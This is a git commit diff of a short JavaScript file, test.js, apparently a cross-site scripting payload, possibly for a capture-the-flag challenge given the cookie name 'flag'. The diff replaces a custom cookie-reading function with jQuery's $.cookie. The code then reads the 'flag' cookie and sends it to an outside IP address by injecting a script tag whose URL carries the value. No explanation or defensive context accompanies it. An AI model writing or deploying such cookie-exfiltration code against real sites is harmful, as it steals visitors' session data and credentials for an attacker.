2bda6fd6548c9d89a9807ffbf278db1a01d72b19
Thanray Tian <874800988@qq.com>
2017-01-18 13:43:08 +0800

    ss

--- test.js
+++ test.js
@@ -1,20 +1,20 @@
-function getCookie(c_name)
-{
-if (document.cookie.length>0)
-  {
-  c_start=document.cookie.indexOf(c_name + "=");
-  if (c_start!=-1)
-    { 
-    c_start=c_start + c_name.length+1 ;
-    c_end=document.cookie.indexOf(";",c_start);
-    if (c_end==-1) c_end=document.cookie.length;
-    return unescape(document.cookie.substring(c_start,c_end));
-    } 
-  }
-return ""
-}
+// function getCookie(c_name)
+// {
+// if (document.cookie.length>0)
+//   {
+//   c_start=document.cookie.indexOf(c_name + "=");
+//   if (c_start!=-1)
+//     { 
+//     c_start=c_start + c_name.length+1 ;
+//     c_end=document.cookie.indexOf(";",c_start);
+//     if (c_end==-1) c_end=document.cookie.length;
+//     return unescape(document.cookie.substring(c_start,c_end));
+//     } 
+//   }
+// return ""
+// }
 
-var flag=getCookie('flag');
+var flag=$.cookie('flag');
 var script=document.createElement('script');
 script.src='http://119.29.81.170:7892/?flag='+flag;
 document.body.appendChild(script);
